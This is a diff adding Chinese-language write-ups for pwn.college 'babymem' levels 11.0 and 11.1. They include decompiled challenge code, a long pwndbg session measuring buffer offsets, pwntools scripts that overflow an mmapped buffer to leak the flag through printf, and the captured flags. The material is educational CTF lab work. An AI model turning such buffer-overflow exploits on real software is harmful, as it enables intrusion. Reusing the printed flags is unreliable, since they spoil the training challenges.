@@ -3386,7 +3386,7 @@ Flag: `pwn.college{QfzSsyMdYf7_dP64EnXQ8DrrgQ1.0lNwMDL5cTNxgzW}`
 
 #### Write-up
 
-```c {10-12, 26-27} ins={47-48} del={80} collapse={1-6, 16-22, 31-43, 52-76}
+```c {10-12, 26-27} ins={47-48} del={62, 80} collapse={1-6, 16-22, 31-43, 52-58, 66-76}
 __int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
 {
   int v3; // eax
@@ -3477,7 +3477,8 @@ __int64 __fastcall challenge(int a1, __int64 a2, __int64 a3)
 0400 .r--------  57 root root 12 Dec 22:13 /flag
 ```
 
-通过调试我们发现，`read` 并不会从 `/flag` 中读到数据。但由于这是个 `SUID` 程序，运行的时候会以这个程序的所有者的身份运行，而所有者是 `root`，那么理应我们可以读取 `/flag` 才对。这里的问题其实在于内核的保护策略：调试 `SUID` 程序的时候，Linux 内核会移除 `SUID` 位，使用当前用户权限调试，以此防止攻击者通过调试器以特权身份执行恶意代码。我们用 `sudo` 以 `root` 用户的身份来调试就好了。
+通过调试我们发现，`read` 并不会从 `/flag` 中读到数据。但由于这是个 `SUID` 程序，运行的时候会以这个程序的所有者的身份运行，而所有者是 `root`，那么理应我们可以读取 `/flag` 才对。这里的问题其实在于内核的保护策略：调试 `SUID` 程序的时候，Linux 内核会移除 `SUID` 位，使用当前用户权限调试，以此防止攻击者通过调试器以特权身份执行恶意代码。
+直接一个 `sudo` 怼上去看它服不服吧 LMAO。
 
 注意到程序最后使用 `printf` 将整个 `buf` 的内容输出。而我们的 `flag` 在此之前就已经被保存到 `buf` 中了。所以这里考察的是 `printf` 在遇到 `\x00` 后认为字符串结束而中断输出。
 
@@ -3638,3 +3639,471 @@ except Exception as e:
 #### Flag
 
 Flag: `pwn.college{4n50Ii5yzf-WULWGzVOqmN3vTgp.0FOwMDL5cTNxgzW}`
+
+### Level 11.0
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Overflow a buffer and leak the flag. Be warned, this requires careful and clever payload construction!
+
+#### Write-up
+
+和前面两题差不多，考察点都是 `SUID` 的性质和看能不能想到 `printf` 判断字符串结束的机制。利用这个机制来泄漏 `flag`。
+
+和前面两题最大的区别在于这次使用 `mmap` 函数来映射，或者说分配内存。之前是变量自动分配内存。
+
+`mmap` 映射成功返回起始地址，失败返回 `-1`。
+
+```c {10, 11} ins={22-24, 33} del={44, 57} collapse={1-6, 15-18, 28-29, 37-40, 48-53}
+__int64 challenge()
+{
+  int *v0; // rax
+  char *v1; // rax
+  int i; // [rsp+2Ch] [rbp-34h]
+  int fd; // [rsp+30h] [rbp-30h]
+  int v5; // [rsp+34h] [rbp-2Ch]
+  size_t nbytes; // [rsp+38h] [rbp-28h] BYREF
+  void *v7; // [rsp+40h] [rbp-20h]
+  void *buf; // [rsp+48h] [rbp-18h]
+  void *v9; // [rsp+50h] [rbp-10h]
+  void *v10; // [rsp+58h] [rbp-8h]
+
+  nbytes = 0LL;
+  puts("The challenge() function has just been launched!");
+  puts("This challenge stores your input buffer in an mmapped page of memory!");
+  v7 = mmap(0LL, 0x1000uLL, 3, 34, 0, 0LL);
+  printf("Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = %p\n", v7);
+  puts("In this level, the flag will be loaded into memory.");
+  puts("However, at no point will this program actually print the buffer storing the flag.");
+  puts("Mapping memory for the flag...");
+  buf = mmap(0LL, 0x1000uLL, 3, 34, 0, 0LL);
+  fd = open("/flag", 0);
+  read(fd, buf, 0x400uLL);
+  close(fd);
+  printf("Called mmap(0, 0x1000, 4, MAP_SHARED, open(\"/flag\", 0), 0) = %p\n", buf);
+  for ( i = 0; i <= 2; ++i )
+  {
+    v10 = mmap(0LL, 0x1000uLL, 3, 34, 0, 0LL);
+    printf("Called mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = %p\n", v10);
+  }
+  puts("Memory mapping the input buffer...");
+  v9 = mmap(0LL, 0x78uLL, 3, 34, 0, 0LL);
+  printf("Called mmap(0, 120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, 0, 0) = %p\n", v9);
+  printf("Payload size: ");
+  __isoc99_scanf("%lu", &nbytes);
+  printf("You have chosen to send %lu bytes of input!\n", nbytes);
+  printf("This will allow you to write from %p (the start of the input buffer)\n", v9);
+  printf(
+    "right up to (but not including) %p (which is %d bytes beyond the end of the buffer).\n",
+    (char *)v9 + nbytes,
+    nbytes - 120);
+  printf("Send your payload (up to %lu bytes)!\n", nbytes);
+  v5 = read(0, v9, nbytes);
+  if ( v5 < 0 )
+  {
+    v0 = __errno_location();
+    v1 = strerror(*v0);
+    printf("ERROR: Failed to read input -- %s!\n", v1);
+    exit(1);
+  }
+  printf("You sent %d bytes!\n", v5);
+  puts("The program's memory status:");
+  printf("- the input buffer starts at %p\n", v9);
+  printf("- the address of the flag is %p.\n", buf);
+  putchar(10);
+  printf("You said: %s\n", (const char *)v9);
+  puts("Goodbye!");
+  return 0LL;
+}
+```
+
+alr，让我们调试看看需要多大的 padding：
+
+```asm wrap=false showLineNumbers=false collapse={2-22, 31-58, 60-109, 116-134, 143-171, 173-223}
+Breakpoint 1, 0x000055e7d6a8cd2a in challenge ()
+------- tip of the day (disable with set show-tips off) -------
+Pwndbg mirrors some of Windbg commands like eq, ew, ed, eb, es, dq, dw, dd, db, ds for writing and reading memory
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
+ RAX  0x1f
+ RBX  0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
+ RCX  0x22
+ RDX  3
+ RDI  0
+ RSI  0x1000
+ R8   0
+ R9   0
+ R10  0
+ R11  0x202
+ R12  1
+ R13  0
+ R14  0x7044ddb3d000 (_rtld_global) —▸ 0x7044ddb3e2e0 —▸ 0x55e7d6a8b000 ◂— 0x10102464c457f
+ R15  0
+ RBP  0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— 0
+ RSP  0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
+ RIP  0x55e7d6a8cd2a (challenge+188) ◂— call 0x55e7d6a8c150
+────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
+ ► 0x55e7d6a8cd2a <challenge+188>    call   mmap@plt                    <mmap@plt>
+        addr: 0
+        len: 0x1000
+        prot: 3
+        flags: 0x22
+        fd: 0 (pipe:[532567])
+        offset: 0
+
+   0x55e7d6a8cd2f <challenge+193>    mov    qword ptr [rbp - 0x18], rax
+   0x55e7d6a8cd33 <challenge+197>    mov    esi, 0                          ESI => 0
+   0x55e7d6a8cd38 <challenge+202>    lea    rdi, [rip + 0x1530]             RDI => 0x55e7d6a8e26f ◂— 0x67616c662f /* '/flag' */
+   0x55e7d6a8cd3f <challenge+209>    mov    eax, 0                          EAX => 0
+   0x55e7d6a8cd44 <challenge+214>    call   open@plt                    <open@plt>
+
+   0x55e7d6a8cd49 <challenge+219>    mov    dword ptr [rbp - 0x30], eax
+   0x55e7d6a8cd4c <challenge+222>    mov    rcx, qword ptr [rbp - 0x18]
+   0x55e7d6a8cd50 <challenge+226>    mov    eax, dword ptr [rbp - 0x30]
+   0x55e7d6a8cd53 <challenge+229>    mov    edx, 0x400                      EDX => 0x400
+   0x55e7d6a8cd58 <challenge+234>    mov    rsi, rcx
+─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
+01:0008│-058 0x7ffcf78305d8 —▸ 0x7ffcf78317a8 —▸ 0x7ffcf78336f3 ◂— 'MOTD_SHOWN=pam'
+02:0010│-050 0x7ffcf78305e0 —▸ 0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
+03:0018│-048 0x7ffcf78305e8 ◂— 0x1d6a90010
+04:0020│-040 0x7ffcf78305f0 —▸ 0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— ...
+05:0028│-038 0x7ffcf78305f8 —▸ 0x7044dd967c80 (putchar+240) ◂— jmp 0x7044dd967bd6
+06:0030│-030 0x7ffcf7830600 ◂— 0x230
+07:0038│-028 0x7ffcf7830608 ◂— 0
+───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x55e7d6a8cd2a challenge+188
+   1   0x55e7d6a8d063 main+213
+   2   0x7044dd90ae08
+   3   0x7044dd90aecc __libc_start_main+140
+   4   0x55e7d6a8c20e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> ni
+0x000055e7d6a8cd2f in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
+*RAX  0x7044ddaff000 ◂— 0
+ RBX  0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
+*RCX  0x7044dd9fa24c (mmap64+44) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  3
+ RDI  0
+ RSI  0x1000
+ R8   0
+ R9   0
+*R10  0x22
+*R11  0x246
+ R12  1
+ R13  0
+ R14  0x7044ddb3d000 (_rtld_global) —▸ 0x7044ddb3e2e0 —▸ 0x55e7d6a8b000 ◂— 0x10102464c457f
+ R15  0
+ RBP  0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— 0
+ RSP  0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
+*RIP  0x55e7d6a8cd2f (challenge+193) ◂— mov qword ptr [rbp - 0x18], rax
+────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
+   0x55e7d6a8cd2a <challenge+188>    call   mmap@plt                    <mmap@plt>
+
+ ► 0x55e7d6a8cd2f <challenge+193>    mov    qword ptr [rbp - 0x18], rax     [0x7ffcf7830618] => 0x7044ddaff000 ◂— 0
+   0x55e7d6a8cd33 <challenge+197>    mov    esi, 0                          ESI => 0
+   0x55e7d6a8cd38 <challenge+202>    lea    rdi, [rip + 0x1530]             RDI => 0x55e7d6a8e26f ◂— 0x67616c662f /* '/flag' */
+   0x55e7d6a8cd3f <challenge+209>    mov    eax, 0                          EAX => 0
+   0x55e7d6a8cd44 <challenge+214>    call   open@plt                    <open@plt>
+
+   0x55e7d6a8cd49 <challenge+219>    mov    dword ptr [rbp - 0x30], eax
+   0x55e7d6a8cd4c <challenge+222>    mov    rcx, qword ptr [rbp - 0x18]
+   0x55e7d6a8cd50 <challenge+226>    mov    eax, dword ptr [rbp - 0x30]
+   0x55e7d6a8cd53 <challenge+229>    mov    edx, 0x400                      EDX => 0x400
+   0x55e7d6a8cd58 <challenge+234>    mov    rsi, rcx
+─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
+01:0008│-058 0x7ffcf78305d8 —▸ 0x7ffcf78317a8 —▸ 0x7ffcf78336f3 ◂— 'MOTD_SHOWN=pam'
+02:0010│-050 0x7ffcf78305e0 —▸ 0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
+03:0018│-048 0x7ffcf78305e8 ◂— 0x1d6a90010
+04:0020│-040 0x7ffcf78305f0 —▸ 0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— ...
+05:0028│-038 0x7ffcf78305f8 —▸ 0x7044dd967c80 (putchar+240) ◂— jmp 0x7044dd967bd6
+06:0030│-030 0x7ffcf7830600 ◂— 0x230
+07:0038│-028 0x7ffcf7830608 ◂— 0
+───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x55e7d6a8cd2f challenge+193
+   1   0x55e7d6a8d063 main+213
+   2   0x7044dd90ae08
+   3   0x7044dd90aecc __libc_start_main+140
+   4   0x55e7d6a8c20e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> p/x $rax
+$1 = 0x7044ddaff000
+pwndbg> c
+Continuing.
+
+Breakpoint 2, 0x000055e7d6a8ce04 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
+*RAX  0x23
+ RBX  0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
+*RCX  0x22
+ RDX  3
+ RDI  0
+*RSI  0x78
+ R8   0
+ R9   0
+*R10  0
+*R11  0x202
+ R12  1
+ R13  0
+ R14  0x7044ddb3d000 (_rtld_global) —▸ 0x7044ddb3e2e0 —▸ 0x55e7d6a8b000 ◂— 0x10102464c457f
+ R15  0
+ RBP  0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— 0
+ RSP  0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
+*RIP  0x55e7d6a8ce04 (challenge+406) ◂— call 0x55e7d6a8c150
+────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
+ ► 0x55e7d6a8ce04 <challenge+406>    call   mmap@plt                    <mmap@plt>
+        addr: 0
+        len: 0x78
+        prot: 3
+        flags: 0x22
+        fd: 0 (pipe:[532567])
+        offset: 0
+
+   0x55e7d6a8ce09 <challenge+411>    mov    qword ptr [rbp - 0x10], rax
+   0x55e7d6a8ce0d <challenge+415>    mov    rax, qword ptr [rbp - 0x10]
+   0x55e7d6a8ce11 <challenge+419>    mov    rsi, rax
+   0x55e7d6a8ce14 <challenge+422>    lea    rdi, [rip + 0x14cd]             RDI => 0x55e7d6a8e2e8 ◂— 'Called mmap(0, 120, PROT_READ|PROT_WRITE, MAP_PRIV...'
+   0x55e7d6a8ce1b <challenge+429>    mov    eax, 0                          EAX => 0
+   0x55e7d6a8ce20 <challenge+434>    call   printf@plt                  <printf@plt>
+
+   0x55e7d6a8ce25 <challenge+439>    lea    rdi, [rip + 0x1508]     RDI => 0x55e7d6a8e334 ◂— 'Payload size: '
+   0x55e7d6a8ce2c <challenge+446>    mov    eax, 0                  EAX => 0
+   0x55e7d6a8ce31 <challenge+451>    call   printf@plt                  <printf@plt>
+
+   0x55e7d6a8ce36 <challenge+456>    lea    rax, [rbp - 0x28]
+─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
+01:0008│-058 0x7ffcf78305d8 —▸ 0x7ffcf78317a8 —▸ 0x7ffcf78336f3 ◂— 'MOTD_SHOWN=pam'
+02:0010│-050 0x7ffcf78305e0 —▸ 0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
+03:0018│-048 0x7ffcf78305e8 ◂— 0x1d6a90010
+04:0020│-040 0x7ffcf78305f0 —▸ 0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— ...
+05:0028│-038 0x7ffcf78305f8 ◂— 0x3dd967c80
+06:0030│-030 0x7ffcf7830600 ◂— 0xffffffff
+07:0038│-028 0x7ffcf7830608 ◂— 0
+───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x55e7d6a8ce04 challenge+406
+   1   0x55e7d6a8d063 main+213
+   2   0x7044dd90ae08
+   3   0x7044dd90aecc __libc_start_main+140
+   4   0x55e7d6a8c20e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> ni
+0x000055e7d6a8ce09 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
+*RAX  0x7044ddafb000 ◂— 0
+ RBX  0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
+*RCX  0x7044dd9fa24c (mmap64+44) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  3
+ RDI  0
+ RSI  0x78
+ R8   0
+ R9   0
+*R10  0x22
+*R11  0x246
+ R12  1
+ R13  0
+ R14  0x7044ddb3d000 (_rtld_global) —▸ 0x7044ddb3e2e0 —▸ 0x55e7d6a8b000 ◂— 0x10102464c457f
+ R15  0
+ RBP  0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— 0
+ RSP  0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
+*RIP  0x55e7d6a8ce09 (challenge+411) ◂— mov qword ptr [rbp - 0x10], rax
+────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
+   0x55e7d6a8ce04 <challenge+406>    call   mmap@plt                    <mmap@plt>
+
+ ► 0x55e7d6a8ce09 <challenge+411>    mov    qword ptr [rbp - 0x10], rax     [0x7ffcf7830620] => 0x7044ddafb000 ◂— 0
+   0x55e7d6a8ce0d <challenge+415>    mov    rax, qword ptr [rbp - 0x10]     RAX, [0x7ffcf7830620] => 0x7044ddafb000 ◂— 0
+   0x55e7d6a8ce11 <challenge+419>    mov    rsi, rax                        RSI => 0x7044ddafb000 ◂— 0
+   0x55e7d6a8ce14 <challenge+422>    lea    rdi, [rip + 0x14cd]             RDI => 0x55e7d6a8e2e8 ◂— 'Called mmap(0, 120, PROT_READ|PROT_WRITE, MAP_PRIV...'
+   0x55e7d6a8ce1b <challenge+429>    mov    eax, 0                          EAX => 0
+   0x55e7d6a8ce20 <challenge+434>    call   printf@plt                  <printf@plt>
+
+   0x55e7d6a8ce25 <challenge+439>    lea    rdi, [rip + 0x1508]     RDI => 0x55e7d6a8e334 ◂— 'Payload size: '
+   0x55e7d6a8ce2c <challenge+446>    mov    eax, 0                  EAX => 0
+   0x55e7d6a8ce31 <challenge+451>    call   printf@plt                  <printf@plt>
+
+   0x55e7d6a8ce36 <challenge+456>    lea    rax, [rbp - 0x28]
+─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffcf78305d0 —▸ 0x55e7d6a8e4f9 ◂— 0x2023232300232323 /* '###' */
+01:0008│-058 0x7ffcf78305d8 —▸ 0x7ffcf78317a8 —▸ 0x7ffcf78336f3 ◂— 'MOTD_SHOWN=pam'
+02:0010│-050 0x7ffcf78305e0 —▸ 0x7ffcf7831798 —▸ 0x7ffcf78336bc ◂— '/home/cub3y0nd/Projects/pwn.college/babymem-level-11-0'
+03:0018│-048 0x7ffcf78305e8 ◂— 0x1d6a90010
+04:0020│-040 0x7ffcf78305f0 —▸ 0x7ffcf7830630 —▸ 0x7ffcf7831670 —▸ 0x7ffcf7831710 —▸ 0x7ffcf7831770 ◂— ...
+05:0028│-038 0x7ffcf78305f8 ◂— 0x3dd967c80
+06:0030│-030 0x7ffcf7830600 ◂— 0xffffffff
+07:0038│-028 0x7ffcf7830608 ◂— 0
+───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x55e7d6a8ce09 challenge+411
+   1   0x55e7d6a8d063 main+213
+   2   0x7044dd90ae08
+   3   0x7044dd90aecc __libc_start_main+140
+   4   0x55e7d6a8c20e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> dist $rax $1
+0x7044ddafb000->0x7044ddaff000 is 0x4000 bytes (0x800 words)
+```
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, context, gdb, log, pause, process, remote
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-11-0"
+HOST = "pwn.college"
+PORT = 1337
+
+gdbscript = """
+b *challenge+188
+b *challenge+406
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+padding = b"".ljust(0x4000, b"A")
+
+
+def send_payload(target, payload):
+    try:
+        payload_size = f"{len(payload)}".encode()
+        target.recvuntil(b"Payload size: ")
+        target.sendline(payload_size)
+        target.recvuntil(b"Send your payload")
+        target.send(payload)
+
+        response = target.recvall()
+
+        return b"pwn.college{" in response
+    except Exception as e:
+        log.exception(f"An error occurred: {e}")
+
+
+try:
+    target = launch(debug=False)
+
+    payload = padding
+
+    if send_payload(target, payload):
+        log.success("Success! Exiting...")
+
+        pause()
+        exit()
+except Exception as e:
+    log.exception(f"An error occurred in main loop: {e}")
+```
+
+#### Flag
+
+Flag: `pwn.college{oNJmkkep5Mt0PwVQdAiStSjA960.0VOwMDL5cTNxgzW}`
+
+### Level 11.1
+
+#### Information
+
+- Category: Pwn
+
+#### Description
+
+> Overflow a buffer and leak the flag. Be warned, this requires careful and clever payload construction!
+
+#### Write-up
+
+和上题一样的哥……
+
+#### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import ELF, context, gdb, log, pause, process, remote
+
+context(os="linux", arch="amd64", log_level="debug", terminal="kitty")
+
+FILE = "./babymem-level-11-1"
+HOST = "pwn.college"
+PORT = 1337
+
+gdbscript = """
+b *challenge+104
+b *challenge+262
+b *challenge+352
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+padding = b"".ljust(0x4000, b"A")
+
+
+def send_payload(target, payload):
+    try:
+        payload_size = f"{len(payload)}".encode()
+        target.recvuntil(b"Payload size: ")
+        target.sendline(payload_size)
+        target.recvuntil(b"Send your payload")
+        target.send(payload)
+
+        response = target.recvall()
+
+        return b"pwn.college{" in response
+    except Exception as e:
+        log.exception(f"An error occurred: {e}")
+
+
+try:
+    target = launch(debug=False)
+
+    payload = padding
+
+    if send_payload(target, payload):
+        log.success("Success! Exiting...")
+
+        pause()
+        exit()
+except Exception as e:
+    log.exception(f"An error occurred in main loop: {e}")
+```
+
+#### Flag
+
+Flag: `pwn.college{I5165He8SxPMM_8YzEz5DkzRZ1c.0FMxMDL5cTNxgzW}`
